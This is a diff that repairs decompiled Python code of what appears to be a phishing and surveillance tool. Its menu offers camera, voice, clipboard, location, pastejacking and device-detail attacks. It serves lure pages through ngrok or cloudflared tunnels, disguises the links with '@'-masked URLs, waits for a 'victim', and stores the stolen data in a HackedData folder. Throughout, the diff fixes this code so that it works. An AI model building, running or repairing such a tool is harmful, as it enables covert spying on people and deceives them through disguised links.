@@ -49,15 +49,11 @@ def update():
         oldVersion = json.loads(open('.version', 'r').read())['version']
     except:
         oldVersion = 'Thonxyzz404 Inc.'
-    else:  # inserted
-        pass  # postinserted
     try:
         newVersion = json.loads(sb.getoutput('curl -s \"https://raw.githubusercontent.com/QrwszXnXnchommed0e56/Pshing/main/.version\"').replace('\n', '').strip())['version']
     except:
         cPrint('\n    cWhite[cRed!cWhite] Something Went Wrong!')
         sys.exit('')
-    else:  # inserted
-        pass  # postinserted
     if not oldVersion == newVersion:
         psb('\n    cWhite[cGreen!cWhite] Tool Update Found!')
         cPrint('    [!] Updating Tool...')
@@ -97,8 +93,6 @@ def printDetails(tmp):
             ipDetails = json.loads(ipDetails)
         except:
             ipDetails == ''
-    else:  # inserted
-        pass  # postinserted
     if not ipDetails == '':
         try:
             country = ipDetails['country_name']
@@ -108,8 +102,6 @@ def printDetails(tmp):
             ISP = ipDetails['connection']['isp']
         except:
             pass
-    else:  # inserted
-        pass  # postinserted
     cPrint('\n    [cGreen*cWhite] IP Address: ' + data['ip'])
     print('')
     cPrint('[cGreen*cWhite] Basic Info [cGreen*cWhite]'.center(columns + 24))
@@ -159,7 +151,7 @@ def setupFiles(redirectUrl, toCopy=None, show=None):
             file = open('./.server/index.js', 'w')
             file.write(jsData.replace('https://you.regettingold.com/', redirectUrl))
             file.close()
-    else:  # inserted
+    else:
         os.system('cp -r ./.site/pasteJacking/* ./.server/')
         jsData = open('./.server/index.js', 'r').read()
         file = open('./.server/index.js', 'w')
@@ -178,7 +170,7 @@ def startNgrok(port):
     cPrint('\n    [cGreen*cWhite] Launching Ngrok...')
     if chroot:
         os.system(f'termux-chroot ngrok http {host}:{port} > /dev/null 2>&1 &')
-    else:  # inserted
+    else:
         os.system(f'ngrok http {host}:{port} > /dev/null 2>&1 &')
     try:
         fileData = json.loads(open('/data/data/com.termux/files/usr/bin/ngtrial.json', 'r').read())
@@ -189,8 +181,6 @@ def startNgrok(port):
             file.close()
     except:
         pass
-    else:  # inserted
-        pass  # postinserted
     time.sleep(5)
     mainUrl = sb.getoutput('curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o \"https://[-0-9a-z]*\\.ngrok.io\"')
     if mainUrl == '':
@@ -202,7 +192,7 @@ def startNgrok(port):
         shortUrl = 'Failed to Short Url'
     if maskUrl:
         maskedUrl = 'https://' + maskUrl.replace(' ', '').replace('/', '') + '@' + shortUrl.replace('https://', '')
-    else:  # inserted
+    else:
         maskedUrl = None
     return (mainUrl, shortUrl, maskedUrl)
 
@@ -211,7 +201,7 @@ def startCloudflared(port):
     cPrint('\n    [cGreen*cWhite] Launching Cloudflared...')
     if chroot:
         os.system(f'termux-chroot cloudflared tunnel -url http://{host}:{port} --logfile ./.cld.log > /dev/null 2>&1 &')
-    else:  # inserted
+    else:
         os.system(f'cloudflared tunnel -url {host}:{port} --logfile .cld.log > /dev/null 2>&1 &')
     time.sleep(8)
     mainUrl = ''
@@ -220,15 +210,10 @@ def startCloudflared(port):
         for line in fileData:
             data = json.loads(line).get('message').replace('|', '').replace('\n', '').strip()
             if data.startswith('https://') and data.endswith('.trycloudflare.com'):
-                pass  # postinserted
-    except:
-        pass  # postinserted
-    pass
-            else:  # inserted
                 mainUrl = data
                 break
-    else:  # inserted
-        pass  # postinserted
+    except:
+        pass
     if mainUrl == '':
         cPrint('\n    [cRed!cWhite] There was a Probleam Starting Cloudflared Server')
         cPrint('    [cGreen!cWhite] Try using other Tunnel\n')
@@ -239,7 +224,7 @@ def startCloudflared(port):
         shortUrl = 'Failed to Short Url'
     if maskUrl:
         maskedUrl = 'https://' + maskUrl.replace(' ', '').replace('/', '') + '@' + shortUrl.replace('https://', '')
-    else:  # inserted
+    else:
         maskedUrl = None
     return (mainUrl, shortUrl, maskedUrl)
 
@@ -253,8 +238,6 @@ def getTunnel():
         addedToken = 'None'
         auth = ''
         trialLeft = '5'
-    else:  # inserted
-        pass  # postinserted
     logo()
     psb('\n   cWhite [cGreen*cWhite] Choose your Expose Method: \n')
     cPrint('    [cGreen01cWhite] Localhost (cGreenFor DevscWhite)')
@@ -315,25 +298,23 @@ def getLog():
     if attackMethod == 'clipboard':
         clipData = open('.server/data.dat', 'r').read()
         cPrint('\n[cGreenDatacWhite]cGreen: cWhite' + clipData)
-    else:  # inserted
-        if attackMethod == 'location':
-            locData = open('.server/data.json', 'r').read()
-            printLocation(locData)
-        else:  # inserted
-            if attackMethod == 'details':
-                while not os.path.exists('.server/data.json'):
-                    pass
-                deviceData = open('.server/data.json', 'r').read()
-                printDetails(deviceData)
+    elif attackMethod == 'location':
+        locData = open('.server/data.json', 'r').read()
+        printLocation(locData)
+    elif attackMethod == 'details':
+        while not os.path.exists('.server/data.json'):
+            pass
+        deviceData = open('.server/data.json', 'r').read()
+        printDetails(deviceData)
     os.system(f'mv ./.server/*{ext} /sdcard/HackedData/{head}{body}{ext}')
 
 def startProcess():
-    global maskUrl  # inserted
+    global maskUrl
     if attackMethod == 'paste':
         show = input(cPrint('\n    cWhite[cGreen*cWhite] Enter Text to ShowcGreen:> cWhite', True))
         toCopy = input(cPrint('\n    [cGreen*cWhite] Enter Text to CopycGreen:> cWhite', True))
         redirectUrl = ''
-    else:  # inserted
+    else:
         cPrint('\n    cWhite[cGreen*cWhite] Enter a Website Url to Redirect')
         redirectUrl = input(cPrint('    cGreen[ cWhiteDefault: YouAreGettingOld cGreen]:cWhite> ', True))
         show = None
@@ -352,9 +333,10 @@ def startProcess():
     localhost = host + ':' + port
     if tunnel == 'ngrok':
         mainUrl, shortUrl, maskedUrl = startNgrok(port)
-    else:  # inserted
-        if tunnel == 'cloudflared':
-            mainUrl, shortUrl, maskedUrl = startCloudflared(port)
+    elif tunnel == 'cloudflared':
+        mainUrl, shortUrl, maskedUrl = startCloudflared(port)
+    else:
+        mainUrl, shortUrl, maskedUrl = None, None, None
     logo()
     cPrint('\ncWhite[cGreen*cWhite] Successfully Hosted atcGreen: cWhitehttp://' + localhost)
     if not tunnel == 'localhost':
@@ -365,21 +347,19 @@ def startProcess():
     cPrint('\n[cGreen*cWhite] Data Saved In cGreen: cWhite/sdcard/HackedData')
     cPrint('\n[cGreen*cWhite] Waiting for Victim, Press cGreenCtrl cWhite+ cGreenc cWhiteto Stop...\n')
     try:
-        pass
-    except KeyboardInterrupt:
-        pass  # postinserted
-    else:  # inserted
-        try:
-            getIp()
-            getLog()
+        while True:
+            try:
+                getIp()
+                getLog()
+                time.sleep(1)
+            except KeyboardInterrupt:
+                raise
     except KeyboardInterrupt:
         cPrint('\n    [cRed!cWhite] Process Stopped By User\n')
         sys.exit()
-    cPrint('\n    [cRed!cWhite] Process Stopped By User\n')
-    sys.exit()
 
 def menu():
-    global attackMethod  # inserted
+    global attackMethod
     logo()
     psb('\n    cWhite[cGreen*cWhite] Choose Your Option: \n')
     cPrint('    [cGreen01cWhite] Camera Hack')
@@ -404,12 +384,14 @@ def menu():
         input(cPrint(' \n    [cGreen*cWhite] Press Enter to Go Back...', True))
         menu()
         sys.exit()
-    else:  # inserted
-        if op == '8':
-            update()
+    elif op == '8':
+        update()
+        menu()
+        return
     attList = ['camera', 'voice', 'clipboard', 'location', 'paste', 'details']
     attackMethod = attList[int(op) - 1]
     startProcess()
+
 if __name__ == '__main__':
     if any((sb.getoutput(f'command -v {pkg}') == '' for pkg in ['php', 'ngrok', 'cloudflared', 'curl', 'wget', 'unzip'])):
         os.system('python setup.py')
